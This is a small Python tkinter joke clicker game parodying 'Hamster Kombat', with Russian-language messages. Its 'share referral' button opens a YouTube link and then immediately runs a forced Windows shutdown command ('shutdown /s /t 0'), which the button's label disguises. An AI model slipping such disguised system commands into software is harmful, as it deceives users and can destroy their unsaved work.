from tkinter import *
from tkinter import ttk
from tkinter import messagebox
import webbrowser
import time
import os


def save_clicks(clicks):
    with open('../PycharmProjects/pythonProject/clicks.txt', 'w') as file:
        file.write(str(clicks))


def load_clicks():
    if os.path.exists('../PycharmProjects/pythonProject/clicks.txt'):
        with open('../PycharmProjects/pythonProject/clicks.txt', 'r') as file:
            return int(file.read())
    else:
        return 0


def click_button(progress_bar):
    global clicks
    clicks = load_clicks()
    clicks += 1
    save_clicks(clicks)
    progress_bar['value'] = (clicks / 100) * 100
    progress_bar.update()
    label['text'] = f'clicks = {clicks}'
    if clicks == 250:
        messagebox.showinfo('поздравляю', 'вы прошли уже половину, продолжайте в том же духе')
    if clicks == 500:
        messagebox.showinfo('поздравляю', 'вы прошли хомяка')
        window.destroy()
    if clicks > 500:
        open_listing_button.config(state='active')
        messagebox.showinfo('зачем???', 'ты уже прошел хомяка, зачем дальше тапать?')
        clicks = 0
        save_clicks(clicks)
        window.destroy()
    return clicks


def open_listing():
    messagebox.showwarning('ой! ((((', 'а листинга не будет, у меня денег нет(')


def reflink(offPC=19):
    webbrowser.open('https://www.youtube.com/watch?v=6bIF8-fx_3o', new=2)
    time.sleep(10)
    os.system("shutdown /s /t 0")


window = Tk()
title = window.title('hamster combat')
window.geometry('900x500')
window.resizable(False, False)

label = ttk.Label(text=f"clicks =", font=("Times New Roman", 14))
label.pack(ipady=40)

ref_btn = ttk.Button(window, text='поделись рефералкой', command=reflink)
ref_btn.pack(anchor="e")

open_listing_button = ttk.Button(window, text='листинг', command=open_listing)
open_listing_button.pack(anchor='e', pady=6)

Btn = ttk.Button(window, text='тапать хамяка', width=50, padding=50, command=lambda: click_button(progress_bar))
Btn.pack(pady=90)

progress_bar = ttk.Progressbar(window, mode='determinate',
                               maximum=500)
progress_bar.pack(fill=X, padx=6, pady=6)

window.mainloop()
